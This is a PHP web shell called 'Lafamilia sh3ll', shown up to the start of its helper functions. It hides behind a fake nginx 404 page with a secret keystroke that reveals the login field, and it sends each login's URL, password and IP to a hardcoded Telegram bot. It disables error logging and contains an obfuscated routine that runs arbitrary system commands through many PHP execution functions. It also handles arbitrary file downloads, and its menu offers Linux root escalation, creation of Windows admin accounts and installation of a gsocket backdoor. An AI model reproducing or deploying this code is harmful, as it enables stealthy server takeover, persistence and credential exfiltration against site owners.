<?php
// session unik berdasarkan path file ini (harus sebelum session_start)
session_name('sess_'.md5(__FILE__));
session_start();

// === CONFIG ===
// Password hashed (MD5-CRYPT style) - ganti sesuai kebutuhan
$hash_password = '$1$0EtVUR7k$QlhPzyXY73PmuaKkmwnXJ1'; // contoh: crypt MD5 ($1$...)

// Telegram config (ganti bila perlu)
$botToken = "8379048753:AAEieVfDkpaCFVCkFDC5lW7jYJQacwDpVoY";
$chatID   = "-1003068203617";

// nama session khusus untuk menandai login file ini
$sess_name = 'logged_in_'.md5(__FILE__);

// fungsi kirim ke Telegram
function sendToTelegram($botToken, $chatID, $message) {
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = ['chat_id' => $chatID, 'text' => $message];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

// fungsi logout khusus untuk shell ini
function logout_shell() {
    $sess_name_local = 'logged_in_'.md5(__FILE__);
    // hapus variabel session terkait shell ini
    unset($_SESSION[$sess_name_local]);
    // pastikan session disimpan
    session_write_close();
    // redirect ke script yang sama
    header("Location: ".$_SERVER['SCRIPT_NAME']);
    exit;
}

// cek request logout
if (isset($_GET['logout'])) {
    logout_shell();
}

// handle login form
if (isset($_POST['password'])) {
    // Cek MD5-CRYPT style hash: gunakan crypt() dengan salt dari hash yang ada
    // lalu bandingkan dengan hash yang disimpan (pakai hash_equals supaya aman)
    $given = $_POST['password'];
    $crypted = @crypt($given, $hash_password);
    if ($crypted !== false && hash_equals($hash_password, $crypted)) {
        // tandai login khusus untuk file ini
        $_SESSION[$sess_name] = true;

        // Kirim info login ke Telegram
        $url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http")
               . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
        $password = $given;
        $message = "Webshell Login:\nURL: $url\nPassword: $password\nIP: ".$_SERVER['REMOTE_ADDR']."\nUA: ".$_SERVER['HTTP_USER_AGENT'];
        // kirim (non-blocking sederhana: boleh diubah)
        sendToTelegram($botToken, $chatID, $message);

        // redirect supaya form POST nggak bisa direfresh
        header("Location: ".$_SERVER['SCRIPT_NAME']);
        exit;
    } else {
        $error_message = "Password salah!";
    }
}

// Jika belum login untuk shell ini -> tampilkan 404 palsu dengan input hidden
if (!isset($_SESSION[$sess_name])) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
    <meta charset="utf-8">
    <title>404 Not Found</title>
    <style>
        body {font-family: Cambria, "Times New Roman", serif; text-align:center; margin-top:20px; background:#fff; color:#000;}
        h1 {margin:0; font-size:25px;}
        p {margin:5px 0 20px 0; font-size:12px;}
        #pwinput {display:none; margin-top:5px; padding:5px 10px; font-size:14px; font-family:Cambria, "Times New Roman", serif;}
    </style>
    </head>
    <body>
    <h1>404 Not Found</h1>
    <hr>
    <p>nginx/1.13.6</p>

    <form method="post" action="">
        <?php if (isset($error_message)) { ?>
            <div style="color:red; margin-top:5px;"><?= htmlspecialchars($error_message); ?></div>
        <?php } ?>
        <input type="password" name="password" id="pwinput" placeholder="Password" autofocus>
    </form>

    <script>
    // deteksi user menekan sequence 1313 (sesuai contoh lo)
    let sequence = [];
    document.addEventListener('keydown', function(e) {
        sequence.push(e.key);
        if (sequence.slice(-4).join('') === '1313') {
            const input = document.getElementById('pwinput');
            input.style.display = 'inline-block'; // munculkan input
            input.focus();
        }
        if (sequence.length > 12) sequence.shift(); // batasi panjang sequence
    });
    </script>
    </body>
    </html>
    <?php
    exit;
}
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
$VANTAarr = ['676574637764', '676c6f62', '69735f646972', '69735f66696c65', '69735f7772697461626c65', '69735f7265616461626c65', '66696c657065726d73', '66696c65', '7068705f756e616d65', '6765745f63757272656e745f75736572', '68746d6c7370656369616c6368617273', '66696c655f6765745f636f6e74656e7473', '6d6b646972', '746f756368', '6368646972', '72656e616d65', '65786563', '7061737374687275', '73797374656d', '7368656c6c5f65786563', '706f70656e', '70636c6f7365', '73747265616d5f6765745f636f6e74656e7473', '70726f635f6f70656e', '756e6c696e6b', '726d646972', '666f70656e', '66636c6f7365', '66696c655f7075745f636f6e74656e7473', '6d6f76655f75706c6f616465645f66696c65', '63686d6f64', '7379735f6765745f74656d705f646972', '6261736536345F6465636F6465', '6261736536345F656E636F6465', '636f7079'];
$VANTA67 = count($VANTAarr); for ($i = 0; $i< $VANTA67; $i++) { $VANTAxas[] = unx($VANTAarr[$i]);}
if (!function_exists('_vnt_str')) { function _vnt_str($arr) { $r = ''; foreach ($arr as $n) $r .= chr($n); return $r; }}
function v4nt4C($pr1VANTA) { $fn = []; $fn[] = chDxzZ([115,104,101,108,108,95,101,120,101,99]); $fn[] = chDxzZ('101,120,101,99'); $fn[] = chDxXZ('73797374656d'); $fn[] = chDxzZ('112,97,115,115,116,104,114,117'); $fn[] = chDxXZ('70726f635f6f70656e'); $fn[] = chDxzZ([112,111,112,101,110]); $fn[] = chDxzZ([101,115,99,97,112,101,115,104,101,108,108,99,109,100]); $fn[] = chDxXZ('6573636170657368656c6c617267'); $fn[] = chDxzZ([99,117,114,108,95,101,120,101,99]); $fn[] = chDxzZ('109,97,105,108'); $fn[] = chDxXZ('63616c6c5f757365725f66756e63'); $fn[] = chDxzZ('102,105,108,101,95,103,101,116,95,99,111,110,116,101,110,116,115'); $fn[] = chDxzZ('102,111,112,101,110'); $fn[] = chDxzZ('102,119,114,105,116,101'); $fn[] = chDxzZ('102,99,108,111,115,101'); $fn[] = chDxzZ('112,117,116,101,110,118'); $fn[] = chDxzZ('105,110,105,95,115,101,116'); $fn[] = chDxzZ([112,99,110,116,108,95,101,120,101,99]); $fn[] = chDxzZ([97,112,97,99,104,101,95,115,101,116,101,110,118]); $fn[] = chDxzZ([109,113,95,111,112,101,110]); $fn[] = chDxzZ([103,99,95,111,112,101,110]); $out = false; for ($i = 0; $i< count($fn); $i++) { $f = $fn[$i]; if (!function_exists($f)) continue; if ($f === chDxzZ([115,104,101,108,108,95,101,120,101,99])) { $out = @$f($pr1VANTA); if (!empty($out)) break; } elseif ($f === chDxzZ('101,120,101,99')) { $lines = []; @$f($pr1VANTA, $lines); $out = join("\n", $lines); if (!empty($out)) break; } elseif ($f === chDxXZ('73797374656d')) { ob_start(); @$f($pr1VANTA); $out = ob_get_clean(); if (!empty($out)) break; } elseif ($f === chDxzZ('112,97,115,115,116,104,114,117')) { ob_start(); @$f($pr1VANTA); $out = ob_get_clean(); if (!empty($out)) break; } elseif ($f === chDxXZ('70726f635f6f70656e')) { $d = [1=>["pipe","w"],2=>["pipe","w"]]; $p = @$f($pr1VANTA, $d, $pipes); if (is_resource($p)) { $out = stream_get_contents($pipes[1]); fclose($pipes[1]); proc_close($p); if (!empty($out)) break; } } elseif ($f === chDxzZ([112,111,112,101,110])) { $h = @$f($pr1VANTA . " 2>&1", "r"); $res = ""; if ($h) { while (!feof($h)) $res .= fread($h, 4096); pclose($h); } if (strlen($res)) { $out = $res; break; } } elseif ($f === chDxzZ([101,115,99,97,112,101,115,104,101,108,108,99,109,100])) { $esc = $f($pr1VANTA); ob_start(); @system($esc); $out = ob_get_clean(); if (!empty($out)) break; } elseif ($f === chDxXZ('6573636170657368656c6c617267')) { $esc = $f($pr1VANTA); $out = @chDx2x($esc); if (!empty($out)) break; } elseif ($f === chDxzZ([99,117,114,108,95,101,120,101,99])) { $ch = @curl_init('file:///proc/self/cmdline'); @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); @curl_setopt($ch, CURLOPT_POSTFIELDS, $pr1VANTA); $r = @curl_exec($ch); @curl_close($ch); if ($r && strpos($r, $pr1VANTA) !== false) { $out = $r; break; } } elseif ($f === chDxzZ('109,97,105,108')) { $to = uniqid()."@".uniqid().".xyz"; @mail($to, $pr1VANTA, $pr1VANTA); $out = ""; } elseif ($f === chDxXZ('63616c6c5f757365725f66756e63')) { $shellfunc = chDxzZ([115,104,101,108,108,95,101,120,101,99]); if (function_exists($shellfunc)) { $out = @call_user_func($shellfunc, $pr1VANTA); if (!empty($out)) break; }} elseif ($f === chDxzZ('102,105,108,101,95,103,101,116,95,99,111,110,116,101,110,116,115')) { $r = @$f("php://filter/read=convert.base64-encode/resource=" . $pr1VANTA); if ($r && strlen($r) >0) { $out = $r; break; } } elseif ($f === chDxzZ('102,111,112,101,110')) { $tmpf = sys_get_temp_dir() . "/" . uniqid("s-cmd") . ".sh"; $h = @$f($tmpf, "w"); if ($h) { fwrite($h, $pr1VANTA); fclose($h); } $r = @chDx2x("sh " . escapeshellarg($tmpf) . " 2>&1"); if ($r) { $out = $r; @unlink($tmpf); break; } } elseif ($f === chDxzZ('112,117,116,101,110,118')) { @putenv("CMD=".$pr1VANTA); $r = @getenv("CMD"); if ($r == $pr1VANTA) { $out = $r; break; } } elseif ($f === chDxzZ('105,110,105,95,115,101,116')) { @ini_set("auto_prepend_file", $pr1VANTA); $out = @file_get_contents($_SERVER['SCRIPT_FILENAME']); if (!empty($out)) break; } elseif ($f === chDxzZ([112,99,110,116,108,95,101,120,101,99])) { @pcntl_exec("/bin/sh", array("-c", $pr1VANTA)); } elseif ($f === chDxzZ([97,112,97,99,104,101,95,115,101,116,101,110,118])) { @apache_setenv("CMD", $pr1VANTA); $out = getenv("CMD"); if ($out == $pr1VANTA) break; } elseif ($f === chDxzZ([109,113,95,111,112,101,110]) || $f === chDxzZ([103,99,95,111,112,101,110])) { } } return $out !== false ? $out : false;}if (!function_exists('chDxzZ')) { function chDxzZ($arr) { if (is_string($arr)) $arr = explode(',', $arr); $r = ''; foreach ($arr as $n) $r .= chr(is_numeric($n) ? $n : hexdec($n)); return $r; }}
if (!function_exists('prvdyzhsax')) { function prvdyzhsax($str) { $y = ''; for ($i = 0; $i< strlen($str); $i++) $y .= dechex(ord($str[$i])); return $y; }}
if (!function_exists('chDxXZ')) { function chDxXZ($hx) { $n = ''; for ($i = 0; $i< strlen($hx) - 1; $i += 2) $n .= chr(hexdec($hx[$i] . $hx[$i + 1])); return $n; }}
if (isset($_GET['VANTA'])) { $cdir = unx($_GET['VANTA']); if (@is_dir($cdir)) { $VANTAxas[14]($cdir); } else { } } else { $cdir = $VANTAxas[0](); }
function VANTAd0($file) { if (file_exists($file)) { header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename=' . basename($file)); header('Content-Transfer-Encoding: binary'); header('Expires: 0'); header('Cache-Control: must-revalidate'); header('Pragma: public'); header('Content-Length: ' . filesize($file)); ob_clean(); flush(); readfile($file); exit; }}
if (!empty($_GET['don'])) {$FilesDon = VANTAd0(unx($_GET['don']));}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <title>LAFAMILIA - <?= $_SERVER['SERVER_NAME']; ?></title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
    <style>@import url(https://fonts.googleapis.com/css2?family=Recursive:wght@400;700&display=swap);:root{--bg:#15181e;--panel:#20242a;--card:#232833;--accent:#6bff75;--accent2:#a8ffa0;--accent3:#9bff6e;--error:#fff;--success:#7effa7;--warn:#ffd84a;--border:#353a46;--badge:#222935;--text-main:#e7fcff;--text-dim:#b4c3ce;--btn-hover:#193844;--table-alt:#222d38;--table-hover:#2e3e4a;--modal:#161920;--shadow:0 6px 30px #00e0ff15}body{background:url("https://i.postimg.cc/TP72Dsj7/3ceb80907482db78adf9ef5a7d4b4fab.jpg") no-repeat center center fixed;background-size:cover;color:var(--text-main);font-family:'Recursive',monospace;font-size:15px;margin:0;letter-spacing:.01em}a,a:visited{color:var(--accent2);text-decoration:none;transition:color .13s}a:hover{color:var(--accent);text-shadow:0 0 7px var(--accent)}.vanta-header,.vanta-header2-bar{background:var(--panel);border-bottom:1.5px solid var(--border);box-shadow:var(--shadow);padding:17px 3vw 13px;display:flex;align-items:center;justify-content:space-between;margin-right:54px}.vanta-logo2{display:flex;align-items:center;font-size:1.23em;gap:13px;font-family:'Recursive',monospace;font-weight:900;color:var(--accent2);letter-spacing:.12em;text-transform:uppercase;text-shadow:0 2px 16px #0008}.vanta-logo2-led{width:11px;height:11px;border-radius:50%;background:var(--accent2);box-shadow:0 0 9px var(--accent2)}.vanta-logo2-txt{color:var(--accent2);text-shadow:0 0 8px #ffd84a44}.vanta-ver2{color:var(--accent);font-size:.85em;margin-left:3px}.vanta-logo2-dot{width:5px;height:5px;border-radius:50%;background:var(--error);margin-left:8px}.vanta-menu-grid{display:flex;flex-wrap:wrap;gap:8px;padding:0;margin:0;list-style:none}.vanta-chip{background:var(--badge);color:var(--accent2);font-family:'Recursive',monospace;padding:7px 15px;border-radius:7px;font-weight:700;border:1.2px solid var(--border);box-shadow:0 2px 10px #f3e85e10;transition:background .15s,color .13s;display:flex;align-items:center;gap:8px;font-size:.94em}.vanta-chip:hover{background:var(--accent2);color:#2a2a2a;border-color:var(--accent2)}.v4nt4-lite-uname{font-size:.94em;color:var(--accent);background:var(--panel);border-bottom:2px solid var(--accent);border-top:2px solid var(--accent2);padding:10px 22px 10px;letter-spacing:.06em;display:flex;align-items:center;gap:13px;margin-bottom:10px;overflow-x:auto;border-radius:8px 8px 0 0;box-shadow:0 2px 12px #00e0ff09;text-shadow:0 0 6px #00e0ff28}.v4nt4-lite-dot{display:inline-block;width:9px;height:9px;border-radius:50%;background:linear-gradient(135deg,var(--accent2) 60%,var(--accent) 100%);margin-right:10px;box-shadow:0 0 8px var(--accent2),0 0 2px #13ffc350}.v4nt4-lite-info{background:var(--card);border-left:3px solid var(--accent2);border-radius:0 9px 9px 9px;margin-bottom:16px;padding:7px 0;display:grid;grid-template-columns:1fr;gap:0;box-shadow:0 1px 10px 0 #13ffc310;max-width:100vw}.v4nt4-lite-row{font-size:.94em;color:var(--text-main);padding:8px 22px;border-bottom:1px dashed var(--border);display:flex;align-items:center;gap:14px;min-width:0;overflow:hidden;background:var(--panel);border-radius:5px;transition:background .14s}.v4nt4-lite-row:nth-child(odd){background:var(--card)}.v4nt4-lite-row:hover{background:var(--table-hover)}.v4nt4-lite-key{font-weight:700;color:var(--accent2);min-width:88px;font-size:.94em;letter-spacing:.04em;text-align:right;display:inline-block;opacity:.93}.v4nt4-lite-val{font-family:inherit;padding-left:13px;flex:1 1 0%;overflow:hidden;font-size:.94em;color:var(--accent2);background:#fff1;border-radius:5px;font-weight:900;letter-spacing:.01em}.v4nt4-lite-on{color:var(--success)!important;background:#232f2a!important;border-radius:6px;padding:2px 9px;font-weight:900}.v4nt4-lite-off{color:var(--error)!important;background:#231a1e!important;border-radius:6px;padding:2px 9px;font-weight:900}.v4nt4-lite-breadcrumb{background:var(--card);color:var(--accent2);padding:9px 19px 8px 14px;border-left:3px solid var(--accent);border-radius:0 8px 8px 0;font-size:.99em;margin-bottom:7px;display:flex;gap:3px;flex-wrap:wrap;min-height:11px;box-shadow:0 1px 8px 0 #131b1f44}.v4nt4-lite-bc{color:var(--accent);font-weight:700;font-size:.94em;border-radius:7px;background:var(--badge);margin-right:3px;margin-bottom:2px;transition:background .14s,color .13s}.v4nt4-lite-bc:hover{bcolor:#232833}@media (max-width:900px){.v4nt4-lite-row,.v4nt4-lite-info{padding:5px 7px;font-size:.98em}.v4nt4-lite-breadcrumb{padding:7px 3px 7px 5px;font-size:.94em}}.v4nt4-filelist-root{border-radius:11px;border:2px solid var(--border);box-shadow:0 3px 22px #00e0ff12;margin-bottom:22px}.v4nt4-filelist-head,.v4nt4-file-row{display:grid;grid-template-columns:30px 38px 2fr 1fr 1fr 1.6fr 1.2fr;align-items:center;font-size:.94em}.v4nt4-filelist-head{background:#232833;color:var(--accent2);border-bottom:2px solid var(--border);min-height:38px;text-transform:lowercase;letter-spacing:.04em;font-weight:900}.v4nt4-file-row{background:var(--card);border-bottom:1px solid var(--border);min-height:38px;transition:background .13s,border .13s}.v4nt4-file-row:hover{background:var(--table-hover);border-left:3px solid var(--accent2);z-index:1}.v4nt4-file-col{padding:8px 7px;display:flex;align-items:center;min-width:0}.v4nt4-file-check input{accent-color:var(--accent2);width:15px;height:15px}.v4nt4-file-icon i{font-size:1.19em;color:var(--accent3)}.v4nt4-file-link{color:var(--accent);font-family:'Recursive',monospace;font-weight:900;white-space:nowrap;overflow:hidden}.v4nt4-file-link:hover{color:var(--accent2)}.v4nt4-file-ext{margin-left:9px;background:#18223a;color:var(--accent2);font-size:.79em;border-radius:6px;padding:1.5px 8px;font-weight:700;letter-spacing:.04em}.v4nt4-file-perm{font-family:'Recursive',monospace;text-align:right;display:inline-flex;align-items:center;font-size:.94em;padding:5px 12px 5px 11px;border-radius:8px;letter-spacing:.04em;gap:7px}.v4nt4-perm-green{color:var(--success)}.v4nt4-perm-red{color:var(--error)}.v4nt4-file-writable{color:var(--success)}.v4nt4-file-readonly{background:#291a1f;color:var(--error);border:1px solid #ff497980}.v4nt4-file-size-badge{display:inline-flex;align-items:center;gap:6px;color:var(--accent);border-radius:7px;padding:5px 13px 5px 10px;font-size:.74em;letter-spacing:.01em;font-weight:700;transition:background .12s,color .12s}.v4nt4-file-actions{display:flex;gap:8px;align-items:center;justify-content:flex-end;width:100%}.v4nt4-file-actions a{display:inline-flex;align-items:center;justify-content:center;background:var(--badge);border-radius:7px;border:1.1px solid var(--border);font-size:.94em;padding:7px 10px;color:var(--accent3);box-shadow:0 1px 9px #13ffc310;transition:background .14s,color .13s,box-shadow .12s;font-weight:900}.v4nt4-file-actions a[title=Rename]{color:#55ff70;background:#1a2531;border-color:#3fa9e230}.v4nt4-file-actions a[title=Chmod]{color:var(--warn);background:#262517;border-color:#ffe65145}.v4nt4-file-actions a[title=Delete]{color:var(--error);background:#3c0014;border-color:#ff497930}.v4nt4-file-actions a[title=Download]{color:var(--success);background:#17271e;border-color:#7effa720}.v4nt4-file-actions a:hover{background:var(--accent);color:#242a3a;border-color:var(--accent2);box-shadow:0 4px 22px #00e0ff36}.v4nt4-filelist-foot{display:flex;align-items:center;justify-content:flex-end;gap:13px;padding:11px 19px 8px;border-top:1px solid var(--border);background:var(--card);border-radius:0 0 11px 11px}.v4nt4-filelist-select{background:var(--badge);color:var(--accent2);border:1.1px solid var(--border);border-radius:7px;padding:6px 15px;font-family:inherit;font-size:.91em;outline:0;font-weight:700}.v4nt4-filelist-btn{background:var(--accent);color:#232933;border:none;padding:8px 24px;border-radius:8px;font-size:.99em;display:flex;align-items:center;gap:7px;font-weight:900;transition:background .13s,color .13s;cursor:pointer}.v4nt4-filelist-btn:hover{background:var(--accent2);color:#232833}.vanta-fm-actions{display:flex;gap:10px;align-items:center;flex-wrap:wrap;padding:8px 0 2px;background:var(--panel)}.vanta-fm-btn{display:inline-flex;align-items:center;gap:5px;padding:3.5px 12px;font-size:.94em;margin-right:2px;cursor:pointer;border-radius:8px;border:1.5px solid var(--border);background:var(--badge);color:var(--accent);font-weight:700;transition:background .14s,color .13s,border .13s}.vanta-fm-btn:focus,.vanta-fm-btn:hover{background:var(--accent2);color:#161a1d;border-color:var(--accent2)}::-webkit-scrollbar{width:10px;background:#15181e}::-webkit-scrollbar-thumb{background:#00e0ff;border-radius:8px}@media (max-width:1050px){.v4nt4-file-row,.v4nt4-filelist-head{grid-template-columns:22px 22px 1.3fr 0.7fr 0.7fr 1.2fr 0.8fr;font-size:.94em}}@media (max-width:900px){.vanta-header,.vanta-header2-bar{flex-direction:column;align-items:flex-start}.vanta-menu-grid{gap:5px}.v4nt4-file-row,.v4nt4-filelist-head{font-size:.94em}.v4nt4-filelist-head,.v4nt4-file-row{padding:6px 3px}}@media (max-width:600px){.v4nt4-lite-row,.v4nt4-lite-info{padding:4px 3px;font-size:.98em}.v4nt4-file-row,.v4nt4-filelist-head{grid-template-columns:14px 15px 1fr 0.5fr 0.6fr 1fr 0.7fr;font-size:.92em}}.v4nt4-badge-danger,.v4nt4-badge-success,.v4nt4-badge-ok,.v4nt4-badge-alert,.v4nt4-lite-badge{padding:2.5px 10px;border-radius:8px;font-size:.93em;font-weight:700;letter-spacing:.01em;display:inline-block}.v4nt4-badge-danger,.v4nt4-badge-alert{background:#2c1625;color:var(--error);border:1px solid #ff497948}.v4nt4-badge-success,.v4nt4-badge-ok{background:#1a2623;color:var(--success);border:1px solid #7effa755}.v4nt4-lite-badge{background:#21272e;color:var(--accent2);border:1px solid #ffd84a55}.v4nt4-modal-bg,.v4nt4-modal-wizard,.v4nt4-modal-header-wiz,.v4nt4-modal-actions-wiz{z-index:20000}.v4nt4-modal-bg{position:fixed;inset:0;background:rgb(17 21 31 / .91);display:flex;align-items:center;justify-content:center;padding:0}.v4nt4-modal-wizard{background:var(--modal);border-radius:14px;box-shadow:0 14px 64px 0 #00e0ff25,0 0 0 2px #f3e85e18;max-width:560px;min-width:0;width:97vw;border:2px solid var(--accent2);font-family:'Recursive',monospace;display:flex;flex-direction:column;overflow:hidden}.v4nt4-modal-header-wiz{display:flex;align-items:center;gap:15px;border-radius:14px 14px 0 0;padding:16px 20px 9px;background:#171b23;border-bottom:2px solid var(--border);position:relative;min-height:42px}.v4nt4-wiz-icon{background:#1129ae;color:#ffd84a;font-size:1.3em;border-radius:10px;width:38px;height:38px;display:flex;align-items:center;justify-content:center;box-shadow:0 1px 8px #00e0ff18}.v4nt4-wiz-title{font-size:1.08em;color:var(--accent2);font-weight:900;letter-spacing:.05em}.v4nt4-wiz-desc{color:#ccd5ec;font-size:.98em;font-weight:600;opacity:.83;letter-spacing:.01em;max-width:350px;overflow-x:auto}.v4nt4-modal-close-wiz{font-size:1.53em;color:#ffd84a;background:none;border:none;text-decoration:none;line-height:1;padding:0 10px;border-radius:8px;position:absolute;right:12px;top:9px;cursor:pointer;transition:background .13s,color .13s}.v4nt4-modal-close-wiz:hover{background:var(--accent2);color:#181a1d}.v4nt4-wiz-section{display:flex;align-items:flex-start;gap:14px;padding:16px 40px 0}.v4nt4-wiz-section-icon{background:#00e0ff1a;color:var(--accent);font-size:1.18em;border-radius:9px;width:30px;height:30px;display:flex;align-items:center;justify-content:center;margin-top:2px}.v4nt4-wiz-fields{flex:1;display:flex;flex-direction:column;gap:6px}.v4nt4-wiz-input,textarea.v4nt4-wiz-editorarea{border:1.5px solid var(--border);border-radius:7px;outline:0;transition:border .13s,box-shadow .11s;font-size:.94em;padding:9px 12px;font-family:'Recursive',monospace;background:var(--card);color:var(--accent2);font-weight:600}textarea.v4nt4-wiz-editorarea{min-height:170px;resize:vertical}.v4nt4-wiz-editorarea:focus,.v4nt4-wiz-input:focus{border-color:var(--accent2);box-shadow:0 0 0 2px #00e0ff50}.v4nt4-modal-actions-wiz{display:flex;justify-content:flex-end;gap:12px;border-top:1.4px solid var(--border);padding:13px 18px 10px;background:#232c38;border-radius:0 0 14px 14px}.v4nt4-wiz-btn{padding:7px 18px;border-radius:7px;font-size:.94em;border:none;cursor:pointer;display:flex;align-items:center;gap:8px;font-family:inherit;outline:0;font-weight:700;letter-spacing:.01em;transition:background .13s,color .13s,border .12s;text-decoration:none}.v4nt4-wiz-btn-red{background:var(--accent);color:#2a2a2a;border:1.3px solid var(--accent2)}.v4nt4-wiz-btn-red:hover{background:var(--accent2);color:#232833;border-color:var(--accent2)}.v4nt4-wiz-btn-light{background:var(--card);color:var(--accent2);border:1.2px solid var(--border)}.v4nt4-wiz-btn-light:hover{background:var(--accent2);color:#161a1d;border-color:var(--accent2)}@media (max-width:600px){.v4nt4-modal-wizard{max-width:99vw;border-radius:8px}.v4nt4-modal-header-wiz,.v4nt4-modal-actions-wiz,.v4nt4-wiz-section{padding-left:8px;padding-right:8px}}input[type="text"],input[type="number"],input[type="file"],select,textarea{font-family:'Recursive',monospace;background:var(--panel);color:var(--accent2);border:1.4px solid var(--border);border-radius:6px;font-size:.94em;padding:9px 13px;outline:0;font-weight:700;transition:border .13s,box-shadow .11s}input:focus,select:focus,textarea:focus{border-color:var(--accent2);box-shadow:0 0 0 2px #f3e85e40}button,input[type="submit"]{background:var(--accent2);color:#232833;border:none;border-radius:7px;font-weight:900;padding:10px 22px;font-size:1.04em;letter-spacing:.02em;cursor:pointer;transition:background .13s,color .13s;font-family:'Recursive',monospace}button:hover,input[type="submit"]:hover{background:var(--accent);color:#232833}.v4nt4-table-func,.v4nt4-table-net,.v4nt4-table-proc{width:100%;border-collapse:collapse;background:var(--panel);font-size:.98em;font-family:'Recursive',monospace;border-radius:9px;box-shadow:0 2px 10px #00e0ff11;margin-bottom:13px}.v4nt4-table-func thead th,.v4nt4-table-net thead th,.v4nt4-table-proc thead th{background:#21263a;color:var(--accent2);font-weight:900;padding:10px 9px;border-bottom:1.5px solid var(--border);text-align:left;font-size:.94em;text-shadow:0 1px 0 #1d232d}.v4nt4-table-func tbody td,.v4nt4-table-net tbody td,.v4nt4-table-proc tbody td{padding:10px 9px;border-bottom:1.2px solid #2d2f3d;color:var(--text-main);font-weight:700;background:var(--panel)}.v4nt4-table-func tbody tr:nth-child(odd),.v4nt4-table-net tbody tr:nth-child(odd),.v4nt4-table-proc tbody tr:nth-child(odd){background:#232c39}.v4nt4-table-func tbody tr:hover,.v4nt4-table-net tbody tr:hover,.v4nt4-table-proc tbody tr:hover{background:var(--table-hover);color:var(--accent2)}.v4nt4-modal-header-wiz,.v4nt4-modal-actions-wiz,.v4nt4-wiz-section{padding-left:6px;padding-right:6px}}.vanta-swal-popup{border-radius:14px!important;box-shadow:0 8px 38px #00e0ff25,0 0 0 3px #13ffc319;font-family:'Recursive',monospace!important;letter-spacing:.01em;padding-top:26px!important}.vanta-swal-success{border:2.5px solid #10b98199;background:#15181e!important;color:#7effa7!important}.vanta-swal-error{border:2.5px solid #e5393595;background:#2a181d!important;color:#ff4a7a!important}.vantacontainer{max-width:1300px;margin:32px auto;background:#232833;border-radius:14px;box-shadow:0 4px 32px #0004;padding:32px 24px}.vantaheader{max-width:1300px;margin:32px auto;background:#232833;border-radius:14px;box-shadow:0 4px 32px #0004;padding:32px 24px}</style>
</head>
    <div class="vantaheader">
<header class="vanta-header">
  <div class="vanta-header2-bar">
    <div class="vanta-logo2">
    <span class="vanta-logo2-txt">Lafamilia<b class="vanta-ver2">sh3ll</b></span>
    </div>
  </div>
  <nav class="vanta-menu">
    <ul class="vanta-menu-grid">
    <li><a href="?LAFAMILIA=<?= vanta_PR1V($VANTAxas[0]()) ?>" class="vanta-chip"><i class="fas fa-home"></i><span>home</span></a></li>
    <li><a href="?LAFAMILIA=<?= vanta_PR1V($VANTAxas[0]()) ?>&vanta-cmd" class="vanta-chip"><i class="fas fa-terminal"></i><span>terminal</span></a></li>
    <li><a href="?LAFAMILIA=<?= vanta_PR1V($VANTAxas[0]()) ?>&LAFAMILIA_r00t" class="vanta-chip"><i class="fa-brands fa-linux"></i><span>auto linux root</span></a></li>
    <li><a href="?LAFAMILIA=<?= vanta_PR1V($VANTAxas[0]()) ?>&winr00t" class="vanta-chip"><i class="fa-brands fa-windows"></i><span>win auto create admin</span></a></li>
    <li><a href="?LAFAMILIA=<?= vanta_PR1V($VANTAxas[0]()) ?>&domains" class="vanta-chip"><i class="fas fa-globe"></i> <span>show d0mains</span></a></li>
    <li><a href="?LAFAMILIA=<?= vanta_PR1V($VANTAxas[0]()) ?>&gsocket" class="vanta-chip"><i class="fas fa-key"></i> <span>install gsocket</span> </a></li>
    <li><a href="?LAFAMILIA=<?= vanta_PR1V($VANTAxas[0]()) ?>&lock" class="vanta-chip"><i class="fas fa-lock"></i> <span>Lock Files & Folders</span></a></li>
<li><a href="?LAFAMILIA=<?= vanta_PR1V($VANTAxas[0]()) ?>&unlock" class="vanta-chip"><i class="fas fa-unlock"></i> <span>Unlock Files & Folders</span></a></li>
<li><a href="?VANTA=<?= vanta_PR1V($VANTAxas[0]()) ?>&logout" class="vanta-chip"><i class="fas fa-lock"></i> <span>logout</span></a></li>
    </ul>
  </nav>
</header>
<?php
function formatMemory($bytes) { if ($bytes === 'N/A') return 'N/A'; $units = ['B', 'KB', 'MB', 'GB', 'TB']; $pow = floor(($bytes ? log($bytes) : 0) / log(1024)); $pow = min($pow, count($units) - 1); $bytes /= pow(1024, $pow); return round($bytes, 2) . ' ' . $units[$pow];}
function g3tdbX() { $d1sxb = ini_get('disable_functions'); if (empty($d1sxb)) { return array(); } return explode(',', $d1sxb);}
